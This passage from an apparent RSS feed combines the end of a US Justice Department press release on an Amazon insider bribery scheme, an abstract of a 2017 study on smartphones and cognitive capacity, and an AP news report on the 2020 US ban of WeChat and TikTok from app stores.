and fraudulent merchant appeals that they themselves helped draft.  In total, after their fraudulent reinstatement, the products and merchants earned in excess of $100 million in sales revenue.&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;Facilitating attacks against competitors&lt;/strong&gt;:  The corrupted employees and contractors facilitated attacks against competitors’ 3P accounts and product listings, by (a) sharing competitive intelligence about competitors’ revenues, customers, advertising campaigns, and suppliers; (b) using their inside access to Amazon’s network to suspend competitors’ 3P accounts; and (c) providing consultants with information about Amazon’s internal algorithms, which allowed the consultants to flood competitors’ product listings with fictitious negative product reviews. &lt;/li&gt;
&lt;li&gt;&lt;strong&gt;Misappropriating Amazon’s highly confidential business information&lt;/strong&gt;:  The corrupted employees and contractors also provided consultants and 3P sellers with unauthorized access to Amazon’s highly confidential standard operating procedures and algorithms.  These materials provided an obvious, unfair, competitive benefit to 3P sellers, by giving them coveted insight into the systems that power Amazon’s search engine, Amazon’s product reviews, and Amazon’s enforcement processes.  The misappropriated data also included the contact information for Amazon employees and consumers, which the members of the conspiracy misused and shared widely.&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;Circumventing Amazon’s internal limits on 3P accounts&lt;/strong&gt;:  The corrupted employees and contractors conveyed exclusive benefits that circumvented Amazon’s rules and regulations.  In exchange for bribes, they increased 3P sellers’ storage limits in Amazon’s warehouses, facilitated 3P sellers’ otherwise meritless requests to sell products in restricted categories, and provided 3P sellers with inside knowledge about the most successful advertising campaigns and most profitable product listings.&lt;/li&gt;
&lt;/ul&gt;&lt;p&gt;Conspiracy to use a communication facility in furtherance of commercial bribery, and to gain unauthorized access to a protected computer is punishable by up to five years in prison and a $250,000 fine. &lt;/p&gt;
&lt;p&gt;Conspiracy to commit wire fraud, and wire fraud, are punishable by up to 20 years in prison and a $250,000 fine.&lt;/p&gt;
&lt;p&gt;The case is being investigated by the Federal Bureau of Investigation (FBI), with assistance from the Internal Revenue Service-Criminal Investigations, and the Department of Justice Office of International Affairs.&lt;/p&gt;
&lt;p&gt;The case is being prosecuted by Assistant United States Attorneys Siddharth Velamoor and Steven Masada. &lt;/p&gt;

<title>The Presence of One’s Own Smartphone Reduces Available Cognitive Capacity (2017)</title>
<link>https://www.journals.uchicago.edu/doi/abs/10.1086/691462?journalCode=jacr</link>
<guid isPermaLink="true" >https://www.journals.uchicago.edu/doi/abs/10.1086/691462?journalCode=jacr</guid>
<description>&lt;p&gt;Our smartphones enable—and encourage—constant connection to information, entertainment, and each other. They put the world at our fingertips, and rarely leave our sides. Although these devices have immense potential to improve welfare, their persistent presence may come at a cognitive cost. In this research, we test the “brain drain” hypothesis that the mere presence of one’s own smartphone may occupy limited-capacity cognitive resources, thereby leaving fewer resources available for other tasks and undercutting cognitive performance. Results from two experiments indicate that even when people are successful at maintaining sustained attention—as when avoiding the temptation to check their phones—the mere presence of these devices reduces available cognitive capacity. Moreover, these cognitive costs are highest for those highest in smartphone dependence. We conclude by discussing the practical implications of this smartphone-induced brain drain for consumer decision-making and consumer welfare.&lt;/p&gt;

<title>US bans WeChat, TikTok from app stores, threatens shutdowns</title>
<link>https://apnews.com/a439ead01b75fc958c722daf40f9307c</link>
<guid isPermaLink="true" >https://apnews.com/a439ead01b75fc958c722daf40f9307c</guid>
<description>&lt;p class=&quot;Component-root-0-2-82 Component-p-0-2-74&quot;&gt;The U.S. Commerce Department said Friday it will ban Chinese-owned TikTok and WeChat from U.S. app stores on Sunday and will bar the apps from accessing essential internet services in the U.S. — a move that could effectively wreck the operation of both Chinese services for U.S. users.&lt;/p&gt;
&lt;p class=&quot;Component-root-0-2-82 Component-p-0-2-74&quot;&gt;TikTok won’t face the most drastic sanctions until after the Nov. 3 election, but WeChat users could feel the effects as early as Sunday.&lt;/p&gt;
&lt;p class=&quot;Component-root-0-2-82 Component-p-0-2-74&quot;&gt;The order, which cited national security and data privacy concerns, follows &lt;a class=&quot;&quot; href=&quot;https://apnews.com/880948bbfd3da8c35c84a0d9556375a6&quot;&gt;weeks of dealmaking&lt;/a&gt; over the video-sharing service TikTok. President Donald Trump has pressured the app’s Chinese owner to sell TikTok’s U.S. operations to a domestic company to satisfy U.S. concerns over TikTok’s data collection and related issues.&lt;/p&gt;
&lt;p class=&quot;Component-root-0-2-82 Component-p-0-2-74&quot;&gt;California tech giant Oracle recently &lt;a class=&quot;&quot; href=&quot;https://apnews.com/880948bbfd3da8c35c84a0d9556375a6&quot;&gt;struck a deal with TikTok&lt;/a&gt; along those lines, although details remain foggy and the administration is still reviewing it. Trump said Friday said he was open to a deal, noting that “we have some great options and maybe we can keep a lot of people happy,” suggesting that even Microsoft, which said its TikTok bid had been rejected, might continue to be involved, as well as Oracle and Walmart.&lt;/p&gt;
&lt;p class=&quot;Component-root-0-2-82 Component-p-0-2-74&quot;&gt;Trump noted that TikTok was “very, very popular,” said “we have to have the total security from China,” and added that “we can do a combination of both.”&lt;/p&gt;
&lt;p class=&quot;Component-root-0-2-82 Component-p-0-2-74&quot;&gt;The new order puts pressure on TikTok’s owner, ByteDance, to make further concessions, said James Lewis of the Center for Strategic and International Studies. Trump had said this week that he does not like the idea of ByteDance keeping majority control of TikTok.&lt;/p&gt;
&lt;p class=&quot;Component-root-0-2-82 Component-p-0-2-74&quot;&gt;TikTok expressed “disappointment” over the move and said it would continue to challenge President Donald Trump’s “unjust executive order.” The Commerce Department is enacting an order announced by President Donald Trump in August. TikTok sued to stop that ban.&lt;/p&gt;
&lt;p class=&quot;Component-root-0-2-82 Component-p-0-2-74&quot;&gt;WeChat owner Tencent said in an emailed statement that it will continue to discuss ways to address concerns with the government and look for long-term solutions.&lt;/p&gt;
&lt;p class=&quot;Component-root-0-2-82 Component-p-0-2-74&quot;&gt;Google and Apple, the owners of the major mobile app stores, did not immediately reply to questions. Oracle also did not reply.&lt;/p&gt;
&lt;p class=&quot;Component-root-0-2-82 Component-p-0-2-74&quot;&gt;“At the President’s direction, we have taken significant action to combat China’s malicious collection of American citizens’ personal data, while promoting our national values, democratic rules-based norms, and aggressive enforcement of U.S. laws and regulations,” Commerce Secretary Wilbur Ross said in a prepared statement.&lt;/p&gt;
&lt;div class=&quot;Component-dfp-0-2-78&quot;&gt;
&lt;p&gt;ADVERTISEMENT&lt;/p&gt;

&lt;/div&gt;
&lt;p class=&quot;Component-root-0-2-82 Component-p-0-2-74&quot;&gt;China’s ministry of commerce condemned the ban, and urged the U.S. to stop what it called bullying behavior and wrongdoing. It said China would “take necessary measures to resolutely safeguard the legitimate rights and interests of Chinese companies.”&lt;/p&gt;
&lt;p class=&quot;Component-root-0-2-82 Component-p-0-2-74&quot;&gt;The action is the Trump administration’s latest attempt to counter the influence of China, a rising economic superpower. Since taking office in 2017, Trump has waged a trade war with China, blocked mergers involving Chinese companies and stifled the business of Chinese firms like Huawei, a maker of phones and telecom equipment.&lt;/p&gt;
&lt;div class=&quot;relatedStory-0-2-83 Component-block-0-2-79&quot;&gt;
&lt;p&gt;More Tech Stories:&lt;/p&gt;
&lt;/div&gt;
&lt;p class=&quot;Component-root-0-2-82 Component-p-0-2-74&quot;&gt;China-backed hackers, meanwhile, have been blamed for data breaches of U.S. federal databases and the credit agency Equifax, and the Chinese government strictly limits what U.S. tech companies can do in China.&lt;/p&gt;
&lt;p class=&quot;Component-root-0-2-82 Component-p-0-2-74&quot;&gt;The order requires WeChat, which has millions of U.S. users who rely on the app to stay in touch and conduct business with people and companies in China, to end payments for business transactions through its service as of Sunday and prohibits it from obtaining vital technical services from vendors. The Justice Department said in a filing that it would not target users with criminal or civil penalties for messaging on the app.&lt;/p&gt;
&lt;p class=&quot;Component-root-0-2-82 Component-p-0-2-74&quot;&gt;WeChat users have sued to stop the ban, and a federal judge in California on Friday set an emergency hearing for Saturday at 1:30 p.m. Pacific time.&lt;/p&gt;
&lt;p class=&quot;Component-root-0-2-82 Component-p-0-2-74&quot;&gt;Similar technical limitations for TikTok don’t go into effect until Nov. 12, shortly after the U.S. election. Ross said early Friday on Fox Business Network that access to that app may be possible if certain safeguards are put into place. TikTok says it has 100 million U.S. users and 700 million globally.&lt;/p&gt;
&lt;p class=&quot;Component-root-0-2-82 Component-p-0-2-74&quot;&gt;Nicholas Weaver, a computer science lecturer at UC Berkeley, said the actions taking effect Sunday are short-sighted and suggest that “the U.S. is not to be trusted and not a friendly place for business.” Users, meanwhile, face a security “nightmare” because they won’t be able to get app updates that fix bugs and security vulnerabilities, he said.&lt;/p&gt;
&lt;p class=&quot;Component-root-0-2-82 Component-p-0-2-74&quot;&gt;The technical measures are “enforceable, the question is whether they are legal,” said the Center for Strategic and International Studies’ Lewis, likening them to a U.S. version of China’s “Great Firewall,” which censors its domestic internet. He said there could be a First Amendment challenge.&lt;/p&gt;
&lt;p class=&quot;Component-root-0-2-82 Component-p-0-2-74&quot;&gt;Like most social networks, TikTok collects user data and moderates users’ posts. It grabs users’ locations and messages and tracks what they watch to figure out how best to target ads to them.&lt;/p&gt;
&lt;div id=&quot;afs:Content:9446380697&quot; data-key=&quot;hub-link-embed&quot; class=&quot;Component-hubLink-0-2-80&quot;&gt;&lt;span class=&quot;title-0-2-89&quot;&gt;Full Coverage: &lt;/span&gt;&lt;a class=&quot;link-0-2-90 overrideArticle&quot; href=&quot;https://apnews.com/tag/apf-technology&quot;&gt;Technology&lt;/a&gt;&lt;/div&gt;
&lt;p class=&quot;Component-root-0-2-82 Component-p-0-2-74&quot;&gt;Similar concerns apply to U.S.-based social networks such as Facebook and Twitter, but Chinese ownership adds an extra wrinkle because the Chinese government could demand cooperation from Chinese companies. The administration, however, has provided no specific evidence that TikTok has made U.S. users’ data available to the Chinese government. Some cybersecurity experts question whether the administration’s efforts are more political than rooted in legitimate concerns about Chinese threats to data security.&lt;/p&gt;
&lt;p class=&quot;Component-root-0-2-82 Component-p-0-2-74&quot;&gt;“If there are direct national security threats, that information should be shared with the U.S. population,” said David Kennedy, CEO of cybersecurity firm TrustedSec, before the Commerce Department’s regulations were announced. “We’re not taking about what needs to happen policy-wise, we’re trying to hack this together to hurt China.”&lt;/p&gt;
&lt;p class=&quot;Component-root-0-2-82 Component-p-0-2-74&quot;&gt;TikTok says it does not store U.S. user data in China and that it would not give user data to the government, and does not censor videos per dictates from China.&lt;/p&gt;
